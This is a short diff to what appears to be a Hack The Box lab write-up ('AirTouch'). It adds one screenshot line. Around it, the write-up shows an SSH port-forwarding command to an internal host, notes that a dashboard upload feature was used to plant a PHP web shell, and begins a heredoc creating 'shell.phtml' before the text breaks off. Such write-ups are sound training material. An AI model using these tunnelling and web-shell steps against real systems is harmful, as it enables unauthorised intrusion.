@@ -276,6 +276,8 @@ ssh -f -N -L 4444:192.168.3.1:80 consultant@10.XX.XX.XXX
 
 The dashboard contained a file upload feature. We exploited this to upload a PHP web shell.
 
+![AirTouch](htb_Airtouch__adminphp.png)
+
 1. **Create the Payload:**
 ```bash
 cat > shell.phtml << 'EOF'
